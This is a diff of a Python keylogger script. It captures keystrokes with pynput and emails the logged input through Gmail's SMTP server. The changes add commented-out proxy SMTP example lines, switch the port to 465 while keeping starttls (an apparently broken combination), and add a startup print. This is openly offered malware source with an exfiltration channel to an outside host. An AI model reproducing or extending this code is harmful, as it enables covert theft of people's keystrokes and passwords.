@@ -1,8 +1,14 @@
 #!/usr/bin/env python
 
+#from xsmtplib import SMTP
 import smtplib
 import threading
 from pynput import keyboard
+
+#server = SMTP(host="smtp.example.com", proxy_host="proxy.example.com")
+#server.sendmail("user@example.com", "admin@example.com",
+#               "I have an issue. Please help!")
+#server.quit()
 
 # Create Keylogger Class
 
@@ -41,7 +47,7 @@ class KeyLogger:
     # Create underlying back structure which will publish emails
 
     def send_mail(self, email, password, message):
-        server = smtplib.SMTP('smtp.gmail.com', 587)
+        server = smtplib.SMTP('smtp.gmail.com', 465)
         server.starttls()
         server.login(email, password)
         server.sendmail(email, email, message)
@@ -62,3 +68,4 @@ class KeyLogger:
         with keyboard_listener:
             self.report_n_send()
             keyboard_listener.join()
+            print("Starting keylogger...")
